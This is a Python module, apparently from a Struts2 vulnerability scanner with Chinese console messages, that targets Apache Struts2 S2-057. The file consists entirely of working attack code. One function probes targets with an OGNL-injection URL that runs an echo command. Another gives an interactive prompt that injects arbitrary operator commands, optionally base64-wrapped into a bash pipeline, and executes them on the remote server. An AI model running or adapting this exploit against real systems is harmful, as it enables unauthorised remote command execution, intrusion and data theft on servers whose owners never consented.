#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re

def s2_057(url):
    print("[*] 开始检测S2-057")
    vul_nname = "s2_057"
    cmd = "echo%2078468794903108696"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
    }
    path = r"/%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('"+cmd+"')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action"

    try:
        vurl = urllib.parse.urljoin(url, path)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)

        if "78468794903108696" in req.headers['Location']:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass


def s2_057_exp(url):
    try:
        cmdtype = input("命令模式：[1]默认;[2*]base64 : ")
    except:exit()

    if cmdtype == "2":
        print("[2]base64命令模式")
    else:
        print("[1]默认模式")
        
    while 1:
        try:
            cmd = input("> ")
            if cmd == '':continue
            if cmd == 'exit':exit()
        except:exit()
        
        if cmdtype == "2":
            cmd = "bash -c {echo,"+str(base64.b64encode(cmd.encode('utf-8')),'utf-8')+"}|{base64,-d}|{bash,-i}"

        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        }
        path = r"/%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('"+cmd+"')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action"
        #path = r"/struts2-showcase/%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('"+cmd+"')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action"

        try:
            vurl = urllib.parse.urljoin(url, path)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
            print(req.headers['Location'])
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass